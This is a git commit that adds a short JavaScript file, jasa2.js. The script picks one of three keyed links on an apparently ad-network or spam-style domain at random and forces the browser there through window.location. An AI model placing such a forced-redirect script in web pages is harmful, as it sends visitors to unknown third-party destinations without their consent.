6c7101fae610e7aecae721fc36e8ff833309630f
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-11-07 18:54:03 +0800

    Create jasa2.js

---
+++ jasa2.js
@@ -0,0 +1,11 @@
+
+var dataUrl = [
+  
+  'https://inadmissibleinsensitive.com/j29g9ietq?key=e24eba510c80b3ba9de9d465a7af2b5a',
+  'https://inadmissibleinsensitive.com/gzfadn5d?key=0e05d5a31ff3702d059c7bc6c4517196',
+  'https://inadmissibleinsensitive.com/sqzweewk?key=d9f4e459965fdc155a14210a559c4290'
+
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
